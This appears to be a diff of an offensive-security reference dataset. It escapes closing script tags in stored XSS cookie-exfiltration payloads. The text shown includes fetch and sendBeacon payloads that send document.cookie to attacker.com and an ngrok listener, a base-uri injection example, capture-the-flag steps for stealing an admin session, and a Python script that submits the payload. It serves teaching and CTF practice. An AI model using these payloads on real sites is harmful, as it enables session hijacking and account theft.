@@ -240,7 +240,7 @@ CSP (RFC 7762) is a browser defense-in-depth header (`Content-Security-Policy: s
 - Base-URI Injection: If `base-uri` is missing, injecting `<base href="//attacker.com/">` redirects relative `<script src="app.js">` requests to the attacker's server.""",
     "commands": [
         {
-            "cmd": "<script>fetch('http://attacker.com/leak?c='+encodeURIComponent(document.cookie))</script>",
+            "cmd": "<script>fetch('http://attacker.com/leak?c='+encodeURIComponent(document.cookie))<\\/script>",
             "why": "Standard non-destructive cookie exfiltration payload.",
             "when": "When HTTP response context permits unescaped HTML tags.",
             "internals": "Invokes asynchronous Fetch API to transmit session cookies to external listener.",
@@ -282,7 +282,7 @@ CSP (RFC 7762) is a browser defense-in-depth header (`Content-Security-Policy: s
             "2. Verify XSS execution locally: `<img src=x onerror=console.log(1)>` executes.",
             "3. Audit cookie security: Target cookie has no `HttpOnly` flag.",
             "4. Start external listener: `ngrok http 8080`.",
-            "5. Submit note payload: `<script>fetch('https://ngrok.io/log?c=' + document.cookie)</script>`.",
+            "5. Submit note payload: `<script>fetch('https://ngrok.io/log?c=' + document.cookie)<\\/script>`.",
             "6. Report note URL to admin bot.",
             "7. Listener receives GET request with cookie: `admin_session=CTF{XSS_D0M_C00K1E_TH1EF_2026}`."
         ],
@@ -292,7 +292,7 @@ import requests
 TARGET = "http://target.ctf/create"
 EXFIL_URL = "http://attacker.com/leak?cookie="
 
-payload = f"<script>navigator.sendBeacon('{EXFIL_URL}' + encodeURIComponent(document.cookie));</script>"
+payload = f"<script>navigator.sendBeacon('{EXFIL_URL}' + encodeURIComponent(document.cookie));<\\/script>"
 r = requests.post(TARGET, data={"title": "Test", "content": payload})
 note_id = r.json()["id"]
 
